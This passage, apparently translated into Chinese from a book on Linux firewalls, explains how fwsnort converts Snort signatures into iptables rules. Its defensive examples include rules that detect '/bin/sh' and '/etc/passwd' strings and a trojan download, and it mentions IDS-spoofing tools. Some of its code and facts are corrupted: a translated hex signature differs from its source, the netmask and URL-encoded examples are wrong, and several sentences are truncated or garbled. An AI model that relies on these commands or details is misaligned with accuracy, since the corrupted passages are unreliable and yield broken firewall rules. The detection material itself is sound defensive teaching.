`fwsnort` 生成的等效 `iptables` 命令所示。（两个 `content` 匹配已加粗。）请注意，在翻译后的规则中使用了 `iptables` `--hex-string` 命令行选项，以便 `iptables` 规则在检查网络流量时，可以轻松匹配内核中的不可打印 ASCII 字符。

```
 $IPTABLES -A FWSNORT_FORWARD_ESTAB -p tcp --sport 80 -m string --string
"[AspackDie!]" --algo bm -m string --hex-string "|0f 6d 07 9e 6c 62 6c 68 00 d2 2f
63 6d 64 9d 11 af af 45 c7 72 ac 5f 3138 d0|" --algo bm -m comment --comment "sid:
2001726; msg:
BLEEDING-EDGE VIRUS Trojan-Spy.Win32.Bancos Download; classtype: trojan-activity;
reference:
url,securityresponse.symantec
.com/avcenter/venc/data/pwsteal.bancos.b.html; rev: 6; FWS:1.0;" -j LOG --log-ip-
options --log-tcp-options --log-prefix "[199] SID2001726 ESTAB "
```

## PGPNet 连接尝试签名

Snort 规则中的 `content` 字段可能非常长，如下 `policy.rules` 文件中的 PGPNet `connection attempt` 签名所示：

```
 alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:"POLICY IPSec PGPNet connection
attempt"; content:"|00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 10 02 00 00 00 00 00
00 00 00 88 0D 00 00 5C 00 00 00 01 00 00 00 00  0  0 0P|01 01 00 02 03 00 00 24
01 01 00 00 80 01 00 06 80 02 00 02 80 03 00 03 80 04 00 05 80
0B 00 01 00 0C 00 04 00 01|Q|80 00 00 00 24 02 01 00 00 80
01
00 05 80 02 00 01 80 03 00 03 80 04 00 02 80 0B 00 01 00 0C 00
04 00 01|Q|80 00 00 00
10|; classtype:
protocol-command-decode; sid:1771; rev:6;)
```

长参数对于 `iptables` 来说没有问题。这次我们告诉 `fwsn` 不仅仅是 `LOG` 数据包，我们还在单独的规则中使用 `REJECT` 目标，以防止数据包传输到 UDP 端口 500 上的任何用户态服务器：

```
 $IPTABLES -A FWSNORT_FORWARD -p udp --dport 500 -m string --hex-string "|00 00 00 00
00 00 00 00 00 00 00 00 00 00 01 10 02 00 00 00 00 00 00 00 00 88 88 0D 00 00
00
00 00 01 01 00 00 01 00 00 00|P|01 01 00 02 03 00 00 24
01 01 00 00 80 01 00 06 80 02 00 02 80
03 00 03 80 04 00 05 80
0B 00 01 00 0C 00 04 00 01|Q|80 00 00 00 24 02 01 00 00 80
01
00 05 80 02 00 01 80 03 00 03 80 04 00 02 80 0B 00 01 00 0C 00
04 00 01|Q|80 00 00 00
10|" --algo bm -m comment --comment "sid:1771; msg: POLICY IPSec PGPNet connection
attempt; classtype: protocol-command-decode; rev: 6; FWS:1.0;" -j LOG --log-ip-
--log-prefix "[601] REJ SID1771 "
$IPTABLES -A FWSNORT_INPUT -p udp --dport 500 -m string --hex-string "|00 00 00 00
00 00 00 00 00 00 00 00 00 00 01 10 02 00 00 00 00 00 00 00 00 88 0D 00 00 5C
00 00 00 01 00 00 00 01 00 00 00|P|01 01 00 02 03 00 00 24 01 01 00 00 80
01 00 06 80 02 00 02 80
03 00 03 80 04 00 05 80 0B 00 01 00 0C 00 04 00 01|Q|80 00 00 00 24 02 01 00 00 80
01
00 05 80 02 00 01 80 03 00 03 80 04 00 02 80 0B 00 01 00 0C 00
04 00 01|Q|80 00 00 00
10|" --algo bm -j REJECT --reject-with icmp-port-unreachable
```





首先，Snort 在规则头部中直接支持 IP、ARP、UDP、ICMP 和 TCP（同时在后台对其他协议提供支持）。接下来，Snort 规则头部的地址部分允许 Snort 规则应用于特定的网络或单个 IP 地址。网络可以使用 CIDR 记法（例如 `192.168.10.0/24`）或标准的点分位表示法（例如 `192.168.10.0/255.255.255`）。

最后，定义了传输层的源端口和目的端口号。可以使用冒号（`:`）字符指定端口范围（例如 `21:23` 将适用于端口 21 到 23），并且还可以通过使用感叹号（`!`）字符对端口号进行取反（例如 `!80` 将适用于除 80 端口以外的所有端口）。

# SNORT 头部通配符与变量解析

Snort 规则头部中的任何匹配标准（协议除外）均可设置为通配符值 `any`，这样 Snort 就不会将其检查限制在特定的 IP 地址或端口号上。Snort 还支持定义变量，其关联值（例如 IP 地址列表或端口号列表）在 `snort.conf` 配置文件中指定。

例如，Snort 中的许多基于 Web 的规则包含头部：

```
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS
```

`$HTTP_SERVERS` 变量的定义可能是 `snort.conf` 文件中的列表 `[192.168.10.5,192.168.10.6]`。

## 规则动作与 iptables 仿真

规则动作可以是 `alert`、`log`、`pass`、`activate` 或 `dynamic`，尽管 Snort 规则通常默认为 `alert`。`alert` 动作最重要的——它告诉 Snort 生成事件并记录触发告警的数据包。其余动作提供了额外功能，例如在不采取操作的情况下通过数据包（`pass`）、记录数据包（`log`），或设置某些规则使其在匹配特定规则之前保持休眠，此时它们将变为激活并记录流量（`activate` 和 `dynamic`）。

到目前为止，Snort 规则头部中除 `activate` 和 `dynamic` 动作之外的所有内容都被 iptables 和 fwsnort 的类似功能支持。

可以使用 `-s` `IP` 和 `-d` `IP` 参数分别为 iptables 指定源和目的 IP 地址或网络，并且支持 CIDR 和点分位网络表示法。源目的端口号可以通过 `--sport` `port` 和 `--dport` `port` 选项提供，与 Snort 一样，端口范围用冒号（`:`）字符指定。协议可以使用 `-p` `protocol` 指定。

例如，要构建适用于 TCP 流量的 iptables 规则，你将在使用 iptables 命令中使用 `-p tcp` 参数。要将规则限制为目的端口 53，将使用 `--dport 53`。要将规则应用于 `192.168.10.0/24` 中任何 IP 地址的终。

## 规则动作与告警

Snort 提供了几种用于生成告警和记录的动作；幸运的是，iptables 可以仿真其中很大一部分功能。

- `alert`：该动作最重要的——它告诉 Snort 生成事件并记录触发告警的数据包。
- `log`：记录数据包。
- `pass`：在不采取任何操作的情况下通过数据包。
- `activate`：设置规则使其在匹配特定规则之前保持休眠，此时它们将变为激活并记录流量。
- `dynamic`：与 `activate` 类似，但用于特定的流量模式。

Snort 规则头部中的 `activate` 和 `dynamic` 动作尚未被 iptables 的类似功能支持。

## 翻译 Snort 规则选项：iptables 日志

Snort 复杂的包处理主要由选项驱动。我们首先讨论 iptables 日志与过滤的区别，以及如何在 iptables 中表示一些最关键的 Snort 选项。

`LOG` 目标允许我们在数据包触发告警时生成头部信息的详细日志。




然而，上述列表中所有的数据包头部信息都包含在 `iptables` 日中，方便 `psad` 等应用程序进行分析。

例如，`IP ID`、`ICMP ID` 和 `ICMP sequence numbers` 都包含在 `ICMP Echo Request` 包生成的默认 `iptables` 日志消息中：

```
 Jun  9 11:41:22 iptablesfw kernel: IN=lo OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:
08:00 SRC=127.0.0.1 DST=127.0.0.1 LEN=84 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=
ICMP TYPE=8 CODE=0 ID=547 SEQ=1
```

尽管在 `iptables` 中无法匹配源 IP 和目的 IP 地址相同（针对任意地址）的数据包，但通过简单地检查 `iptables` 日志消息中的 `SRC` 和 `DST` 值是否相同，就可以模拟 `sameip` Snort 规则选项。

这种检查必须由用户态进程执行，之所以可行是因为日志消息中包含了源 IP 地址和目的 IP 地址，这使得很容易判断它们是否相同。

`sameip` 选项对于检测 LAND 攻击非常重要（参见 [`www.insecure.org/sploits/land.ip.dos.html`](http://www.insecure.org/sploits/land.ip.dos.html)）。在这种攻击中，攻击者发送指向特定 IP 地址的伪造 `TCP SYN` 包看起来来自目标 IP 地址本身——即伪造包中的源 IP 地址与其目的地址相同。许多旧版操作系统（包括 `Windows NT 4.0` 和 `Windows 95`）在处理此类数据包时会完全崩溃，从而使 LAND 成为针对这些系统的有效拒绝服务（DoS）攻击（尽管此类系统已不再广泛部署）。

`seq` 和 `ack` Snort 选项适用于 `TCP` 头中的序列号和确认号，但当数据包命中内核中的 `iptables` 日志规则时，`LOG` 目标默认并不包含这些字段；必须向 `iptables` 二进制文件传递 `--log-tcp-sequence` 参数才能记录这些头部字段。`window` 选项允许 Snort 匹配 `TCP` 窗口大小，且该值默认包含在 `iptables` 日志消息中。`TCP` 序列号、确认号以及窗口大小在下方加粗显示如下：

```
 [iptablesfw]#  iptables -I INPUT 1 -i lo -p tcp --dport 5001 -j LOG --log-tcp-sequence
[iptablesfw]#  nc -v localhost 5001
localhost.cipherdyne.org [127.0.0.1] 5001 (?) : Connection refused
[iptablesfw]#  grep SEQ /var/log/messages | tail -n 1
Jun  9 11:49:54 iptablesfw kernel: IN=lo OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:
08:00 SRC=127.0.0.1 DST=127.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=2838 DF PROTO=
TCP SPT=43827 DPT=5001 SEQ=336880890 ACK=0 WINDOW=32767 RES=0x00 SYN URGP=0
```

### Note

上述列出的所有 Snort 规则选项（如 `id`、`seq` 和 `icode` 等）都指示 Snort 匹配网络层和传输层头部中的特定字段。这些选项中没有任何涉及到处理任何应用层数据。

## Snort 选项与 iptables 数据包过滤

到目前为止，我们讨论了那些在 `iptables` 中仅支持日志记录的 Snort 规则选项。现在我们将查看 `iptables` 同样提供显式匹配和过滤支持的 Snort 规则选项。使用这些选项的 Snort 规则可以转换为等效的 `iptables` 规则（受本节稍后讨论的某些限制），并且可以应用于任何标准的 `iptables` 目标（`DROP`、`LOG`、`REJECT` 等）。属于此类别的的 Snort 规则选项包括：

* `content`
* `uricontent`
* `offset`
* `depth`
* `distance`
* `within`
* `flags`
* `itype`
* `icode`
* `ttl`
* `tos`
* `ipopts`
* `dsize`
* `ip_proto`
* `flow`
* `replace`
* `resp`

### content

Snort 规则语言中的 `content` 选项需要一个字节序列形式的参数，例如 `/bin/sh`，Snort 使用 Boyer-Moore 字符串搜索算法在应用层数据中搜索这些字节。`iptables` 字符串匹配扩展使用相同算法的内核实现（由用户选择），同样在数据包的负载负载中搜索字节序列。给定字符串 `"/bin/sh"`，`content` 选项可以使用如下：

```
alert udp any any -> any 53 (msg:"DNS attack"; content:"/bin/sh"; sid:100001;)
```

### uricontent

`uricontent` 选项允许 Snort 处理 URL 编码数据，这很重要，因为攻击者经常使用编码来绕过简单的字符串过滤器。例如，编码后的字符串 `"%2f%62%99%6e%2f%73%68"` 可以包含在独立的规则中：

```
alert udp any any -> any 53 (msg:"DNS attack"; uricontent:"%2f%62%99%6e%2f%73%68"; sid:100001;)
```

正则表达式与 IPTABLES

有人向 `iptables` 项目维护者提议，为 `iptables` 添加一些有限的正则表达式支持（移除如回引用和重复操作等功能）。然而，在内核中实现一个通用的正则表达式引擎（如非确定性有限自动机或 NFA，类似于在 Perl、Python、GNU Emacs、vi 和 grep 等各种语言、工具和编辑器中所使用的）是一项具有风险的提议。有时，可以构造出某些病态数据，使得特定正则表达式在这些数据上的运行时间可能长达数千年。我们不希望仅仅通过让一个恶意构造的数据包通过系统接口就轻易导致整个内核崩溃！

### offset





`offset` Snort 选项指示 Snort 从数据包负载荷（payload）开始后的指定字节数处开始内容匹配操作。这是一个绝对值，适用于 Snort 规则中的所有内容匹配，且不受多个内容匹配之间相对字节数的影响（`distance` Snort 选项用于实现此功能）。在 `iptables` 中，当在负载荷数据中查找模式时时，通过在字符串匹配扩展（string match extension）中使用 `--from` 命令行参数支持 `offset` 选项（这仅支持内核版本 2.6.14 及更高版本）。以下示例构造了一个 `iptables` 规则，用于丢弃所有目标端口为 80 且在数据包负载荷第 100 字节之后任何位置包含字符串 `"/etc/passwd"` 的 TCP 包：

```
 [iptablesfw]# iptables -A INPUT -p tcp --dport 80 -m string --string "/etc/passwd"
--from 100 --algo bm -j DROP
```

### depth

`depth` Snort 选项要求所有匹配数据包负载荷数据内内容的尝试都不能超过负载荷开始处的指定字节数。与上述 `offset` 选项类似，在 Snort 规则中使用 `depth` 标准将全局应用于所有内容匹配。要搜索间隔不能超过给定字节数的模式，应使用 `within` Snort 规则选项。对于内核版本 2.6.14 及更高版本，使用字符串匹配扩展的 `--to` 命令行参数在 `iptables` 中模拟 `depth` 选项。

以下示例演示了如何使用 `--to` 命令行参数让 `iptables` 丢弃所有目标端口为 80 且在数据包负载荷第 1000 字节之前任何位置包含字符串 `"/etc/passwd"` 的 TCP 包：

```
 [iptablesfw]# iptables -A INPUT -p tcp --dport 80 -m string --string "/etc/passwd"
--to 1000 --algo bm -j DROP
```

### distance

`distance` 选项用于 Snort 指定在模式匹配之间跳过的字节数。目前没有直接的方法告诉字符串匹配扩展从上一个模式匹配开始跳过多少字节，但 `fwsnort` 使用基于上一个模式匹配长度和任何偏移修饰的近似值。要禁用包含 `distance` 关键字的 Snort 规则的翻译，可以在 `fwsnort` 命令行上使用 `--strict` 选项。

### within

`within` 选项指示 Snort 要求在初始匹配后的后续模式匹配必须在指定的字节数内发生。这与 `distance` 选项类似，`fwsnort` 通过上一个模式的长度进行近似来支持该功能（在 `fwsnort` 命令行上使用 `--strict` 可禁用此行为）。

### flags

`flags` Snort 选项将搜索标准应用于 TCP 头部中的控制位。控制位根据 TCP 连接的状态而变化，`iptables` 可以通过 `--tcp-flags` 参数匹配特定的组合。例如，检测 Nmap 操作系统指纹探测尝试的 Snort 规则使用 `flags` 选项来搜索 TCP 头部中的 Syn、Fin、Push 和 Urg 标志。`iptables` 二进制文件的等效参数为 `-p tcp --tcp-flags SYN,FIN,PSH,URG SYN,FIN,PSH,URG`。`--tcp-flags` 命令行开关需要两个参数：应该检查的标志列表，随后是必须实际设置的这些标志的列表。这允许第一个参数作为必须检查的已设置标志位的掩码。

使用 `--tcp-flags` 选项不需要特殊的内核配置选项，因为它内置在 `iptables` 核心 TCP 处理代码中。以下示例说明了一个 `iptables` 规则，用于检测当 TCP 包是否同时设置了 SYN 和 FIN 标志：

```
 [iptablesfw]# iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN -j LOG
--log-prefix "SCAN SYN FIN "
```

### itype and icode

`itype` 和 `icode` 选项分别匹配 ICMP 头部中 8 位的 ICMP 类型（type）和代码（code）字段内的指定数值。例如，为了在 Snort 规则中测试 ICMP 分片需要（fragmentation-needed）包，我们将使用 `itype: 3; icode: 4;` 选项。映射到各种 ICMP 类型和代码的具体数值定义在 RFC 792 中。`iptables` 的 ICMP 处理代码通过参数 `-p icmp --icmp-type type/code` 支持匹配 ICMP 头部内的类型和代码字段，其中 `type/code` 是完整的正确的 ICMP 消息类型（例如 `source-quench`）或其等效数值。通过执行 `# iptables -p icmp -h` 可以获取 `iptables` 支持的所有 ICMP 消息类型的完整列表，相应的数值可以在 `iptables` 源代码 `extensions/libipt_icmp.c` 文件中的 `icmp_codes[]` 数组中找到。

Snort 的 `itype` 和 `icode` 选项都通过使用 `<` 和 `>` 支持 ICMP 类型和代码范围。例如，为了匹配所有大于 10 且小于 30 的 ICMP 类型，可以在 Snort 规则中使用 `itype: >10; icode: <30;`。遗憾的是，`iptables` 匹配不允许 ICMP 类型存在范围的概念，但值得注意的是 `itype` 和 `icode` 是允许的。以下 `iptables` 规则丢弃所有 ICMP 源猝塞（source-quench）消息：

```
 [iptablesfw]# iptables -A INPUT -p icmp --icmp-type 4/0 -j DROP
```

### ttl

`ttl` 选项允许 Snort 匹配 IP 头部中的生存时间（TTL）值。`ttl` 选项非常灵活，允许 TTL 值与指定的整数进行比较。例如，为了匹配 IP 头部中恰好为 30 的 TTL 值，将 Snort 规则 `ttl:30;`。如果仅在 TTL 值小于 30 时匹配，只需 `ttl:<30;` 即可，最后如果仅在 TTL 值大于 30 时匹配，我们将包含 `ttl:>30;`。`iptables` 通过其 TTL 匹配参数 `-m ttl --ttl-lt`、`--ttl-eq` 和 `--ttl-gt` 支持这些操作，如帮助输出所示：

```
 [iptablesfw]# iptables -m ttl -h
TTL match v1.3.7 options:
  --ttl-eq value        Match Time-to-Live value
  --ttl-lt value        Match TTL < value
  --ttl-gt value        Match TTL > value
```

只有在内核配置中启用了 `CONFIG_IP_NF_MATCH_TTL`，`iptables` TTL 匹配才可用。检测并记录所有 TTL 值为 0 的 IP 包的 `iptables` 规则可以如下构建：

```
 [iptablesfw]# iptables -A INPUT -p ip -m ttl --ttl-eq 0 -j LOG --log-prefix "ZERO TTL TRAFFIC "
```

### tos

`tos` 选项指示 Snort 检查 IP 头部中的服务类型（TOS）位，该选项在 Snort 中相对简单，因为它只接受一个数值并带有可选的 `!` 进行取反。`iptables` 的 TOS 匹配通过参数 `-m tos --tos` 支持此选项。TOS 匹配也支持取反，如帮助输出所示：

```
 [iptablesfw]# iptables -m tos -h
TOS match v1.3.7 options:
[!] --tos value              Match Type of Service field from one of the
following numeric or descriptive values:
                               Minimize-Delay 16 (0x10)
                               Maximize-Throughput 8 (0x08)
                               Maximize-Reliability 4 (0x04)
                               Minimize-Cost 2 (0x02)
                               Normal-Service 0 (0x00)
```





下面的示例命令记录了所有 TOS 值为 16（最小延迟）的 IP 数据包：

```
 [iptablesfw]# iptables -A INPUT -p ip -m tos --tos 16 -j LOG --log-prefix "MIN-DELAY
TOS "
```

### ipopts

`ipopts` Snort 选项允许将匹配标准应用到 IP 头部的选项部分。尽管在合法 IP 流量中很少使用 IP 选项，但检测使用源路由 IP 选项的尝试（攻击者可能利用它尝试将数据包路由通过原本不可访问的网络）是非常重要的。Snort 支持对 IP 选项字段的几项测试，这些测试无法在 `iptables` 中模拟。然而，通过 patch-o-matic 提供的 `iptables` `ipv4options` 匹配支持了对源路由选项的重要测试。

例如，要测试松源路由（Loose Source Route）选项，会向 `iptables` 提供参数 `-m ipv4options --lsrr`。要检测严格源路由（Strict Source Route）选项，我们将使用 `-m ipv4options --ssrr`。要检测可辅助网络映射的记录路由（Record Route）选项，我们将使用 `-m ipv4options --rr`（见下方的完整 iptables 命令示例）。`ipv4options` 匹配要求在内核配置文件中启用 `CONFIG_IP_NF_MATCH_IPV4OPTIONS`。

```
 [iptablesfw]# iptables -A INPUT -p ip -m ipv4options --rr -j LOG --log-prefix "RECORD
ROUTE IP OPTION "
```

### dsize

`dsize` Snort 选项对数据包载荷数据的大小提出了要求。它接受一个正整数以及一个可选的 `<` 或 `>` 运算符，用表示为了使规则匹配，数据包应用部分必须存在的字节数。例如，要要求数据包包含至少 500 字节的载荷数据，我们可以在 Snort 规则中使用 `dsize: >500;`。`dsize` 选项还支持使用 `<>` 运算符指定范围的上下下界，如下：`dsize: 400<>500;`。遗憾的是，`iptables` 没有直接的机制来单独指定载荷长度。

然而，`iptables` 的 `length` 匹配通过允许指定数据包长度（包括网络头部、传输头部和应用载荷的组合长度）提供了一个相当的近似。考虑到以下事实：IP 头部几乎总是 20 字节长（通常不包含 IP 选项），构造良好的 UDP 头部以及 ICMP Echo 请求和响应头部始终为 8 字节，且（平均而言）TCP 头部长度的良好估值约为 30 字节（20 字节静态字段和约 10 字节选项），我们为将 Snort 的 `dsize` 选项映射到 `iptables` 规则集有了一个很好的启发式方法。

例如，如果针对 TCP 的 Snort 规则包含选项 `dsize: 200`，那么对于 `iptables` 长度匹配，我们将指定一个长度为 20 + 30 + 200 = 250 字节。`iptables` 的长度匹配接口为 `-m length --length` `bytes`，与 Snort 类似，`iptables` 长度匹配也支持字节范围：`-m length --length` `low:high`。`length` 匹配要求在内核配置文件中启用 `CONFIG_IP_NF _MATCH_LENGTH`。然而，即使无法长度匹配，IP 头部长度也会包含在 `iptables` 日志消息中，因此如 `psad` 等外部应用程序可以将相同的逻辑应用于已记录的数据包，以便对数据包长度做出判断。当然，在日志分析场景中，数据包长度不能作为过滤标准。

### Note

IP 头部和 TCP 头部的平均长度可以通过 `fwsnort` 中的 `/etc/fwsnort/fwsnort.conf` 通过 `AVG_IP_HEADER_LEN` 和 `AVG_TCP_HEADER_LEN` 关键字进行配置。

下面的 `iptables` 命令示例构建了一个规则，记录任何包含 1028 − 20 − 8 = 1000 字节应用层数据的 ICMP 数据包（假设没有设置 IP 选项——在大多数情况下这是一个安全的假设）：

```
 [iptablesfw]# iptables -A INPUT -p icmp -m length --length 1028 -j LOG --log-prefix
"LARGE ICMP MESSAGE "
```

### ip_proto

`ip_proto` Snort 选项允许 Snort 规则限制在 IP 头部协议字段中可能的 256 个值中的任意一个；这些值定义在 `/etc/protocols` 文件中。这并不意味着 Snort 对任意协议具有特殊的解码能力，例如 IP 119 (SRP, SpectraLink Radio Protocol) 或 IP 132 (SCTP, Stream Control Transmission Protocol)；它仅意味着 Snort 可以对匹配该 IP 号的数据包在其 IP 头部之后的数据上应用应用载荷检查。`iptables` 通过 `-p` 协议参数支持 Snort 的 `ip_proto` 选项，与 Snort 类似，`iptables` 接受协议数值值或在 `/etc/protocols` 中列出的完整协议名称。

与许多其他 Snort 选项一样，`ip_proto` 允许通过 `!`、`<` 和 `>` 运算符进行取反范围匹配。此外，Snort 在同一规则内支持多个 `ip_proto` 选项（例如 `ip_proto: !1;`）。`iptables` 也通过 `!` 运算符支持协议取反，但不支持协议范围和单个规则内的多个协议。作为参考，可以从 [`www.iana.org/assignments/protocol-numbers`](http://www.iana.org/assignments/protocol-numbers) 获取所有当前分配的 IP 号的完整列表。

下面是一个旨在让 `iptables` 记录所有通过 IP 47 传输的路由封装（GRE）数据包的示例命令：

```
 [iptablesfw]# iptables -A INPUT -p 47 -j LOG --log-prefix "GRE PACKET "
```

### flow

`flow` Snort 选项是 Snort 规则语言最重要的特性之一，并与流预处理器（stream preprocessor）配合使用。`flow` 选项允许 Snort 规则对重组的 TCP 流应用状态和方向标准。

例如，要求特定规则仅适用于来自 TCP 连接客户端侧的数据，并且仅在三次握手完成后（即连接处于“已建立”状态），我们可以使用选项 `flow: from_client,established`。流预处理器仅适用于 TCP 流量（尽管 stream5 也对 UDP 和 ICMP 有基于时时的支持）。

在流预处理器及其在 Snort 规则中的 `flow` 关键字接口之前，可以从任意源 IP 地址伪造看似恶意的 TCP 数据包，并导致 Snort 在没有合法 TCP 会话的情况下生成警报。Snort 检查 TCP 头部标志部分以查看确认位是否设置的能力很容易通过简单在伪造数据包中手动设置 ACK 位来绕过。`Stick` 和 `Snot` 是最早创建针对 Snort 的此类“无状态”攻击的程序之一。来自 fwsnort 项目的类似 Perl 实现 `snortspoof.pl` 使用 `hping` 工具（参见 [`www.hping.org`](http://www.hping.org)）跨网络伪造 Snort 内容字段。





通过跟踪 `TCP` 连接及其对应的状态，`stream` 预处理器为阻碍此类无状态攻击提供了一种有效机制。TCP 连接若要达到 `established`（已建立）状态，必须完成标准的 TCP 三次握手，这反过来意味着包必须在两个方向上发送。伪造的 TCP ACK 包永远无法成为合法 TCP 连接的一部分，除非该伪造包恰好具有与目标与伪造 IP 地址之间现有连接相同的源端口、目的端口，以及合理的序列号和确认号。这是极不可能的，除非攻击者已经能够监控进入或流出你网络的 TCP 连接，而且拥有那种级别权限的人很可能根本对向已建立的会话注入伪造包不感兴趣；他们会去寻找更有价值的目标，例如直接攻破其他系统。目前，近 90% 的所有 Snort 规则利用 `flow` 选项对处于 `established` 状态的 TCP 连接应用应用检查。

通过使用连接跟踪功能，`iptables` 是一个状态防火墙，因此它不仅为 TCP 连接提供连接跟踪机制，还为 `UDP` 和 `ICMP` 等无连接协议（通过使用超时机制）提供了该机制。尽管 `iptables` 并不提供一种独立于网络层源目的 IP 地址而将数据包匹配标准限制为 TCP 连接内部流量方向的方法（即 Snort 术语中的 `to_server` 或 `to_client`），但它确实允许规则匹配已建立的 TCP 连接。这在入侵检测方面远是最重要的能力，因为与 `stream` 预处理器一样，攻击者无法欺骗 `iptables` 针对看起来像恶意的伪造 TCP ACK 包采取行动。要指示 `iptables` 匹配已建立的 TCP 连接，我们可以使用以下命令行参数：`-p tcp -m state --state ESTABLISHED`。状态匹配也可以应用于 TCP 连接的其他阶段，例如 `NEW`（匹配 TCP SYN 包）和 `INVALID`（匹配无法被归类为属于现有连接的包）：

```
 [iptablesfw]# iptables -m state -h
state v1.3.7 options:
 [!] --state [INVALID|ESTABLISHED|NEW|RELATED|UNTRACKED][,...]
                                要匹配的状态(s)
```

以下示例展示了如何使用状态扩展，尽早地 `INPUT` 链中接受作为已建立 TCP 会话部分的数据包：

```
 [iptablesfw]# iptables -I INPUT 1 -p tcp -m state --state ESTABLISHED -j ACCEPT
```

### Replace

`replace` Snort 选项仅在 Snort 运行在内核模式（inline mode）并部署在数据包数据路径上才有效。在这种模式下，Snort 变成了一个真正的入侵防御系统，只有在数据包经过 Snort 检测引擎检查后，才允许其进出受保护的网络。`replace` 选项作用于应用层数据，允许将由 `content` 选项检测到的字节序列替换为另一个等长度的序列。

字符串等长的要求源于：序列号和确认号必须在现有 TCP 会话的上下文中继续保持意义。如果替换了更长的字符串，接收端收到的数据将比发送端实际发送的多，这将破坏 TCP。

在 Snort 运行于内核模式的 Snort 规则中，为了将字符串 `"/usr/local/bin/bash"` 替换为 `"EqualLengthString!!"`，我们将使用两个选项：`content: /usr/local/bin/bash` 和 `replace: EqualLengthString!!`。这种操作仅当 `fwsnort` 项目提供的 `--replace-string` 补丁应用到字符串匹配扩展时才被 `iptables` 支持。该补丁仅兼容 2.4 内核，并且对 `iptables` 的“匹配”概念进行了放宽，因为匹配本不应该修改数据包数据；该补丁的未来版本将实现一个新的 `iptables` 目标，允许修改数据包数据。在此期间，在你旧的 2.4 内核上，以下命令允许 `iptables` 将所有通过 80 端口的 TCP 流量中的字符串 `"/bin/sh"` 替换为 `"/abc/de"`（这永远对应真实系统中二进制文件的实际路径）：

```
 [iptablesfw]# iptables -A INPUT -p tcp --dport 80 -m string --string "/bin/sh"
--replace-string "/abc/de" -j ACCEPT
```

上述 `iptables` 规则中的目标被设置为 `ACCEPT`，因此在内核内部发生修改后，数据包仍被允许继续到达目的地。目的地的 Web 服务器可以决定如何处理收到的看起来奇怪的 `"/abc/de"` 路径；可能会生成并向客户端返回一个应用程序错误代码。

在传输过程中替换应用层数据需要重新计算传输层校验和；对于 TCP 是强制的，对于 `UDP` 是可选的，取决于原始数据包是否先计算了 `UDP` 校验和。内核数据替换提供了静默破坏某些漏洞的可能，这比生成破坏会话的流量或实例化防火墙拦截规则是一种隐蔽的响应攻击方法——那些方法特征明显，极易被攻击者发现。

### Resp

由 `flexresponse` 和 `flexresponse2` Snort 检测插件提供的 `resp` 选项允许 Snort 积极响应触发签名匹配的网络流量。可用的响应包括向会话发送 TCP RST/ACK 包以拆除会话（注意 `flexresponse` 和 `flexresponse2` 插件始终发送 RST/ACK 包而不是 RST 包），以及响应 `UDP` 流量生成 ICMP 网络不可达、主机不可达或端口不可达包。`iptables` 的 `REJECT` 目标通过参数 `-j REJECT --reject-with tcp-reset` 支持 TCP 连接以及 `-j REJECT --reject-with icmp-*-unreachable`（其中 `*` 可以是 `net`、`host` 或 `port`）支持 UDP 包。

`REJECT` 目标与 Snort 响应能力的一个区别是，TCP RST 包只能被发送到连接的一侧。也就是说，如果数据包匹配了 `iptables` `REJECT` 规则，TCP RST 包将只会发送匹配包中的源 IP 地址，而该 IP 地址可能是连接的客户端或服务器端。如果 TCP 栈由于本地内核级过滤机制未接收到入站的 RST 包（或因为中间跳节点丢弃了它），则会话将无法正常关闭。幸运的是，`REJECT` 目标也会丢弃匹配的数据包，因此 TCP 会话不会继续进行。

### Note

`REJECT` 扩展的未来版本（或 `fwsnort` 项目提供的补丁）将支持向 TCP 连接的双方发送 TCP RST 包。如果一侧表现不佳并过滤了入站 RST，因为它试图在忽略另一方是否尝试关闭连接的情况下继续 TCP 连接，那么向相反方向发送的 RST 仍会强制连接关闭（假设只有一方在表现不当）。

以下 `iptables` 命令结合使用字符串匹配扩展，对任何包含字符串 `"/etc/passwd"` 的 Web 会话发送 RST：

```
 [iptablesfw]# iptables -A INPUT -p tcp --dport 80 -m string --string "/etc/passwd"
--algo bm -j REJECT --reject-with tcp-reset
```





关于结合 fwsn 规则集使用 `REJECT` 目标的更多细节，请参阅第 11 章]。

## 终止 "/ETC/PASSWD" 网络会话

恶意系统可以过滤由远程 iptables 防墙生成的传入 RST 或 RST/ACK 数据包，我们将在第 201 页的“DROP vs. REJECT 目标”中深入讨论。在这里，我们简要说明 `REJECT` 目标如何针对过滤传入 TCP RST 数据包的 iptables 防墙起作用。我们设置了两个系统（客户端和服务器）如下：在服务器系统上，我们使用 `Netcat` 在 80 端口运行一个 TCP 服务器；在客户端系统上，我们使用 `Netcat` 向服务器发送字符串 `"/etc/passwd"`。在服务器上，`iptables` 被配置为匹配 `/etc/passwd` 字符串并对连接进行 RST（重置）：

```
[server]# iptables -I INPUT 1 -p tcp --dport 80 -m string --string "/etc/passwd"
--algo bm -j REJECT --reject-with tcp-reset
```

在客户端，传入的 RST 数据包在本地 TCP 栈接收之前之前被丢弃：

```
[client]# iptables -I INPUT 1 -p tcp --tcp-flags RST RST -j DROP
```

现在我们在服务器系统上启动 `Netcat` 和 `tcpdump`，并从客户端向服务器发送 `/etc/passwd` 字符串。❶ 处的数据包是来自服务器上 iptables 的第一个 RST 数据包，其余数据包显示，尽管客户端过滤了传入的 RST，会话仍然无法继续，因为包含 `/etc/passwd` 字符串的数据包被丢弃了。

当客户端 TCP 栈反复重传 `/etc/passwd` 数据包时，服务器上的 `iptables` 再次对每个数据包响应另一个 RST（例如 ❷）：

```
[server]# nc -l -p 80
[client]# echo "/etc/passwd" | nc 192.168.10.1 80
[server]# tcpdump -i eth1 -l -nn port 80
01:10:24.479149 IP 192.168.10.2.32655 > 192.168.10.1.80: S 2179395558:2179395558(0)
win 5840 <mss 1460,sackOK,timestamp 47589526 0,nop,nop,nop,nop>
01:10:24.479216 IP 192.168.10.1.80 > 192.168.10.2.32655: S 2434738187:2434738187(0)
ack 2179395559 win 5792 <mss 1460,sackOK,timestamp 10356968 47589526>
01:10:24.481620 IP 192.168.10.2.32655 > 192.168.10.1.80: . ack 1 win 5840 <nop,nop,
timestamp 47589527 10356968>
